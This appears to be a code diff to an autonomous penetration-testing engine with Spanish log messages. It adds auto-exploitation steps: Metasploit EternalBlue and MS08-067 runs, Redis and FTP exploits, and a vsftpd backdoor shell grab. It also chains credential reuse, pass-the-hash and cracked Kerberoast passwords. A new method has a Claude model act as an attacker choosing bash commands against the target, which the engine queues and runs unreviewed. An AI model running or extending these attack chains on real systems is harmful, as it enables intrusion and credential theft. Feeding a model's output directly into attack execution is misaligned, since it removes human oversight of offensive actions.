@@ -556,7 +556,7 @@ def run_workflow():
             if step.get("parse") and project_id:
                 output_text = "\n".join(job["output"])
                 try:
-                    parsed = _parse_tool_output(step["parse"], output_text, rhost_val)
+                    parsed = _parse_tool_output(step["parse"], output_text, rhost_val, step.get("name", ""))
                 except Exception:
                     parsed = None
 
@@ -593,10 +593,13 @@ def run_workflow():
                         pass
 
                 # ── Dynamic step injection (autonomous_pentest only) ────────
-                if workflow.get("auto_inject") and parsed and parsed.get("open_ports"):
+                if workflow.get("auto_inject") and parsed:
                     try:
-                        port_nums = {p["port"] for p in parsed["open_ports"]}
-                        _inject_followup_steps(steps, injected, port_nums, rhost_val)
+                        port_nums = {p["port"] for p in parsed.get("open_ports", [])}
+                        if port_nums:
+                            _inject_followup_steps(steps, injected, port_nums, rhost_val)
+                        if parsed.get("findings"):
+                            _inject_exploitation_steps(steps, injected, parsed["findings"], vars_dict, rhost_val)
                     except Exception:
                         pass
 
@@ -927,16 +930,49 @@ def _attach_msf_command(finding, rhost, vars_dict):
             break
 
 
+def _inject_exploitation_steps(steps, injected, findings, vars_dict, rhost):
+    """Inject exploitation steps for detected vulnerabilities that have exploit_cmd."""
+    lhost = vars_dict.get("lhost", "")
+    lport = vars_dict.get("lport", "4444")
+
+    for finding in findings:
+        exploit_cmd = finding.get("exploit_cmd", "")
+        if not exploit_cmd:
+            continue
+        title = finding.get("title", "")
+        exploit_key = f"exploit_{re.sub(r'[^a-z0-9]', '_', title.lower())[:40]}"
+        if exploit_key in injected:
+            continue
+
+        # Only inject MSF exploits (use exploit/...) — skip suggestions/comments
+        if "use exploit/" in exploit_cmd or "use auxiliary/" in exploit_cmd:
+            safe_cmd = exploit_cmd.replace("'", '"')
+            steps.append({
+                "name": f"[Auto-Exploit] {title[:60]}",
+                "command": f"msfconsole -q -x '{safe_cmd}; exit' 2>/dev/null",
+                "parse": "msf_exploit",
+            })
+            injected.add(exploit_key)
+
+        # Non-MSF direct exploits (redis, ftp, etc.)
+        elif any(t in exploit_cmd for t in ("redis-cli", "ftp -n", "nc -w")):
+            steps.append({
+                "name": f"[Auto-Exploit] {title[:60]}",
+                "command": exploit_cmd,
+                "parse": "exploit_result",
+            })
+            injected.add(exploit_key)
+
+
 def _inject_followup_steps(steps, injected, port_nums, rhost):
     """Dynamically append follow-up scan steps based on discovered ports."""
     if (port_nums & {80, 443, 8080, 8443, 8000, 8888}) and "nuclei_web" not in injected:
         steps.append({
             "name": "[Auto] Nuclei Web Vuln Scan",
             "command": (
-                f"nuclei -u http://{rhost} https://{rhost} "
-                f"-t /root/nuclei-templates/ "
-                f"-severity critical,high,medium -silent -j 2>/dev/null || "
-                f"nuclei -u http://{rhost} -severity critical,high,medium -silent -j 2>/dev/null"
+                f"nuclei -u http://{rhost} -u https://{rhost} "
+                f"-severity critical,high,medium -j -timeout 10 -no-color 2>/dev/null || "
+                f"nuclei -u http://{rhost} -severity critical,high,medium -j 2>/dev/null || true"
             ),
             "parse": "nuclei",
         })
@@ -1041,7 +1077,7 @@ def _inject_followup_steps(steps, injected, port_nums, rhost):
         injected.add("sql_check")
 
 
-def _parse_tool_output(tool, output_text, rhost=""):
+def _parse_tool_output(tool, output_text, rhost="", job_name=""):
     loot      = []
     suggestions = []
     open_ports  = []
@@ -1093,15 +1129,16 @@ def _parse_tool_output(tool, output_text, rhost=""):
     }
 
     # Match nmap vuln script VULNERABLE blocks
-    vuln_re = re.compile(
-        r'\|\s+([\w-]+):\s*\n(?:(?:\|[^\n]*)\n)*?\|\s+VULNERABLE',
-        re.MULTILINE | re.IGNORECASE
-    )
-    for m in vuln_re.finditer(output_text):
+    # nmap outputs script results as consecutive lines starting with |
+    # e.g.:  | smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution...
+    vuln_block_re = re.compile(r'\|\s+([\w\-]+):\s*\r?\n((?:\|[^\n]*\n)+)', re.MULTILINE)
+    for m in vuln_block_re.finditer(output_text):
+        block = m.group(0)
+        if not re.search(r'VULNERABLE', block, re.IGNORECASE):
+            continue
         script = m.group(1).lower()
-        block = output_text[m.start():min(m.start()+800, len(output_text))]
-        cve_m = re.search(r'CVE[:-](CVE-[\d-]+)', block, re.IGNORECASE)
-        cve = cve_m.group(1) if cve_m else ""
+        cve_m = re.search(r'CVE[:\-](\d{4}[:\-]\d+)', block, re.IGNORECASE)
+        cve = f"CVE-{cve_m.group(1).replace(':', '-')}" if cve_m else ""
 
         severity = "high"
         desc = f"Nmap script {m.group(1)} reportó el host como VULNERABLE."
@@ -1124,7 +1161,7 @@ def _parse_tool_output(tool, output_text, rhost=""):
         })
 
     # ── FTP anonymous login ───────────────────────────────────────────────────
-    if re.search(r'ftp-anon.*Anonymous FTP login allowed|Anonymous.*login.*allowed', output_text, re.IGNORECASE):
+    if re.search(r'ftp-anon.*Anonymous login allowed|Anonymous FTP login allowed|Anonymous.*login.*allowed', output_text, re.IGNORECASE):
         ev_m = re.search(r'(ftp-anon[^\n]+)', output_text, re.IGNORECASE)
         findings.append({
             "id": str(uuid.uuid4()), "title": "FTP — Login Anónimo Permitido",
@@ -1134,7 +1171,7 @@ def _parse_tool_output(tool, output_text, rhost=""):
         })
 
     # ── vsftpd backdoor confirmed ─────────────────────────────────────────────
-    if re.search(r'vsftpd.backdoor|backdoor.*6200|ftp-vsftpd-backdoor.*BACKDOOR', output_text, re.IGNORECASE):
+    if re.search(r'ftp-vsftpd-backdoor|vsftpd 2\.3\.4.*backdoor|vsftpd.*backdoor|vsftpd_234', output_text, re.IGNORECASE):
         findings.append({
             "id": str(uuid.uuid4()), "title": "FTP — vsftpd 2.3.4 Backdoor CONFIRMADO",
             "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
@@ -1163,7 +1200,7 @@ def _parse_tool_output(tool, output_text, rhost=""):
         })
 
     # ── SMB signing disabled ──────────────────────────────────────────────────
-    if re.search(r'message[_ ]signing.*disabled|signing.*False|SMB.*signing.*not required', output_text, re.IGNORECASE):
+    if re.search(r'message[_ ]signing.*disabled|signing.*False|SMB.*signing.*not required|Message signing enabled but not required', output_text, re.IGNORECASE):
         ev_m = re.search(r'([^\n]*signing[^\n]*)', output_text, re.IGNORECASE)
         findings.append({
             "id": str(uuid.uuid4()), "title": "SMB Signing Deshabilitado",
@@ -4792,7 +4829,7 @@ class AutonomousEngine:
         return output_text, job_id
 
     def _save_parsed(self, output, target, tool_name):
-        parsed = _parse_tool_output(tool_name, output, target)
+        parsed = _parse_tool_output(tool_name, output, target, tool_name)
         with self._project_lock:
             return self._save_parsed_locked(parsed, output, target, tool_name)
 
@@ -5032,6 +5069,70 @@ class AutonomousEngine:
                         self._enqueue(35, f"AI:{line[:40]}", cmd, target)
         except Exception:
             pass
+
+    def _ask_claude(self, output_text, target, context_summary=""):
+        """Use Claude to decide next pentesting steps based on tool output."""
+        import os
+        import urllib.request as _req
+        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
+        if not api_key:
+            return
+        known_ports = ", ".join(
+            f"{p}({s})" for p, s, v in self._known_services.get(target, [])[:15]
+        )
+        system_prompt = (
+            "Eres un pentester experto analizando output de herramientas de seguridad. "
+            "Tu trabajo es decidir los siguientes pasos de ataque. "
+            "Responde ÚNICAMENTE con JSON válido, sin markdown ni explicación adicional."
+        )
+        user_prompt = (
+            f"Target: {target}\n"
+            f"Puertos conocidos: {known_ports or 'desconocidos'}\n"
+            f"Contexto previo: {context_summary[:500] if context_summary else 'ninguno'}\n\n"
+            f"Output de herramienta:\n{output_text[:3000]}\n\n"
+            "Responde SOLO con este JSON:\n"
+            '{"next_commands": ["cmd1", "cmd2"], "reasoning": "breve explicación", "priority": "high/medium/low"}\n'
+            "Los comandos deben ser ejecutables directamente en bash contra el target. "
+            f"Usa la IP {target} directamente. Máximo 3 comandos."
+        )
+        try:
+            body = json.dumps({
+                "model": "claude-haiku-4-5-20251001",
+                "max_tokens": 400,
+                "system": system_prompt,
+                "messages": [{"role": "user", "content": user_prompt}]
+            }).encode()
+            req = _req.Request(
+                "https://api.anthropic.com/v1/messages",
+                data=body,
+                headers={
+                    "Content-Type": "application/json",
+                    "x-api-key": api_key,
+                    "anthropic-version": "2023-06-01",
+                },
+                method="POST"
+            )
+            with _req.urlopen(req, timeout=30) as resp:
+                data = json.loads(resp.read())
+                text = data.get("content", [{}])[0].get("text", "").strip()
+            if not text:
+                return
+            # Strip potential markdown code fences
+            text = re.sub(r'^```(?:json)?\s*|\s*```$', '', text.strip())
+            result = json.loads(text)
+            cmds = result.get("next_commands", [])
+            priority_map = {"high": 15, "medium": 25, "low": 35}
+            pri = priority_map.get(result.get("priority", "medium"), 25)
+            reasoning = result.get("reasoning", "")
+            if reasoning:
+                self._log(f"CLAUDE [{target}] {reasoning[:100]}")
+            for cmd in cmds[:3]:
+                cmd = cmd.strip()
+                if cmd and len(cmd) > 5 and not cmd.startswith("#"):
+                    self._enqueue(pri, f"Claude:{cmd[:40]}", cmd, target)
+                    self._log(f"CLAUDE [{target}] Enqueued: {cmd[:60]}")
+        except Exception as _e:
+            self._log(f"CLAUDE [{target}] Error: {_e}")
 
     def _ping_sweep(self, cidr):
         self._log(f"SWEEP Ping sweep {cidr}...")
@@ -5410,46 +5511,52 @@ class AutonomousEngine:
                 break
             name, command, target = task["name"], task["command"], task["target"]
             self._log(f"EXEC [{target}] {name}")
-            output, job_id = self._run_sync(name, command, target, timeout=job_timeout)
-            _, new_creds = self._save_parsed(output, target, name.split(":")[0])
-            self._capture_exploit_evidence(output, target, name, command)
+            try:
+                output, job_id = self._run_sync(name, command, target, timeout=job_timeout)
+                _, new_creds = self._save_parsed(output, target, name.split(":")[0])
+                self._capture_exploit_evidence(output, target, name, command)
 
-            self._react_to_findings(output, target, name)
+                self._react_to_findings(output, target, name)
 
-            if "CredReuse-SSH:" in name and "uid=" in output:
-                parts = name.split(":")
-                user = parts[2] if len(parts) > 2 else ""
-                pwd = self._cred_map.get(f"{target}:{user}", "")
-                if user and pwd:
-                    self._post_exploit(target, user, pwd, output)
+                if "CredReuse-SSH:" in name and "uid=" in output:
+                    parts = name.split(":")
+                    user = parts[2] if len(parts) > 2 else ""
+                    pwd = self._cred_map.get(f"{target}:{user}", "")
+                    if user and pwd:
+                        self._post_exploit(target, user, pwd, output)
 
-            if "PivotCheck:" in name:
-                self._process_pivot_output(output, target)
+                if "PivotCheck:" in name:
+                    self._process_pivot_output(output, target)
 
-            if new_creds and self.mode != "stealth":
-                # Extract any NTLM hashes from loot for PTH
-                project_snap = read_project(self.project_id)
-                _ntlm_from_loot = [
-                    l["value"].split(":")[1] if ":" in l["value"] else l["value"]
-                    for l in (project_snap or {}).get("loot", [])
-                    if l.get("type") == "hash" and re.match(r'[a-fA-F0-9]{32}', l.get("value",""))
-                ][:10]
-                self._credential_reuse(new_creds, target, ntlm_hashes=_ntlm_from_loot or None)
+                if new_creds and self.mode != "stealth":
+                    project_snap = read_project(self.project_id)
+                    _ntlm_from_loot = [
+                        l["value"].split(":")[1] if ":" in l["value"] else l["value"]
+                        for l in (project_snap or {}).get("loot", [])
+                        if l.get("type") == "hash" and re.match(r'[a-fA-F0-9]{32}', l.get("value",""))
+                    ][:10]
+                    self._credential_reuse(new_creds, target, ntlm_hashes=_ntlm_from_loot or None)
 
-            # Feed cracked Kerberoast/ASREPRoast passwords back into credential reuse
-            if any(x in name for x in ["Kerberoast-Crack", "ASREPRoast-Crack"]):
-                _kracked = re.findall(r'\$krb5(?:tgs|asrep)\$[^\s:]{10,}:(\S{3,})', output)
-                _kracked += re.findall(r'^(\w[\w.@\-]+):(\S{3,}):.*\$krb5', output, re.MULTILINE)
-                for _item in _kracked:
-                    _pw = _item if isinstance(_item, str) else f"{_item[0]}:{_item[1]}"
-                    if _pw and self.mode != "stealth":
-                        _dom = self._domain or ""
-                        self._log(f"KERBEROAST [{target}] Contraseña crackeada → credential reuse: {_pw[:20]}")
-                        self._credential_reuse([_pw], target)
+                if any(x in name for x in ["Kerberoast-Crack", "ASREPRoast-Crack"]):
+                    _kracked = re.findall(r'\$krb5(?:tgs|asrep)\$[^\s:]{10,}:(\S{3,})', output)
+                    _kracked += re.findall(r'^(\w[\w.@\-]+):(\S{3,}):.*\$krb5', output, re.MULTILINE)
+                    for _item in _kracked:
+                        _pw = _item if isinstance(_item, str) else f"{_item[0]}:{_item[1]}"
+                        if _pw and self.mode != "stealth":
+                            self._log(f"KERBEROAST [{target}] Contraseña crackeada → credential reuse: {_pw[:20]}")
+                            self._credential_reuse([_pw], target)
 
-            if self.mode == "aggressive" and len(output) > 150:
-                self._ask_ollama(output, target)
-            self._completed_jobs.append({"job_id": job_id, "name": name, "target": target})
+                if self.mode == "aggressive" and len(output) > 150:
+                    self._ask_ollama(output, target)
+                # Claude AI decision making (normal + aggressive, only for significant output)
+                if self.mode in ("normal", "aggressive") and len(output) > 200 and \
+                        not name.startswith("Claude:") and not name.startswith("AI:"):
+                    import os as _os
+                    if _os.environ.get("ANTHROPIC_API_KEY"):
+                        self._ask_claude(output, target)
+                self._completed_jobs.append({"job_id": job_id, "name": name, "target": target})
+            except Exception as _worker_exc:
+                self._log(f"ERROR [{target}] Worker error en '{name}': {_worker_exc}")
             if delay:
                 time.sleep(delay)
 
@@ -5458,7 +5565,8 @@ class AutonomousEngine:
         ol = output.lower()
 
         # ms17-010 VULNERABLE → EternalBlue MSF priority 0
-        if re.search(r'ms17-010.*vulnerable|vulnerable.*ms17-010|smb-vuln-ms17-010.*VULNERABLE', output, re.I):
+        # Requires both the script name AND VULNERABLE to appear anywhere in output (multiline-safe)
+        if re.search(r'smb-vuln-ms17-010|ms17-010', output, re.I) and re.search(r'VULNERABLE', output, re.I):
             self._log(f"REACT [{target}] MS17-010 CONFIRMADO → EternalBlue AHORA")
             self._enqueue(0, f"EternalBlue:{target}",
                 f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
@@ -5467,7 +5575,7 @@ class AutonomousEngine:
                 f"set ExitOnSession false; run -j; sleep 30; sessions -l; exit' 2>/dev/null", target)
 
         # MS08-067 VULNERABLE
-        if re.search(r'ms08-067.*vulnerable|VULNERABLE.*ms08-067', output, re.I):
+        if re.search(r'ms08-067|smb-vuln-ms08-067', output, re.I) and re.search(r'VULNERABLE', output, re.I):
             self._log(f"REACT [{target}] MS08-067 → MSF netapi")
             self._enqueue(0, f"MS08067:{target}",
                 f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; "
@@ -5497,8 +5605,10 @@ class AutonomousEngine:
                 f"redis-cli -h {target} bgsave 2>/dev/null && "
                 f"echo 'Redis RCE cron written'", target)
 
-        # vsftpd backdoor confirmed → grab shell
-        if "VSFTPD_BACKDOOR_CONFIRMED" in output or re.search(r'vsftpd.*backdoor.*root|uid=0.*vsftpd', output, re.I):
+        # vsftpd backdoor confirmed → grab shell (nmap outputs ftp-vsftpd-backdoor + VULNERABLE)
+        if ("VSFTPD_BACKDOOR_CONFIRMED" in output or
+                re.search(r'ftp-vsftpd-backdoor', output, re.I) and re.search(r'VULNERABLE', output, re.I) or
+                re.search(r'vsftpd.*backdoor.*root|uid=0.*vsftpd', output, re.I)):
             self._log(f"REACT [{target}] vsftpd backdoor → grabbing shell")
             self._enqueue(0, f"vsftpd-Shell-Grab:{target}",
                 f"echo 'id; whoami; hostname; cat /root/root.txt 2>/dev/null; "
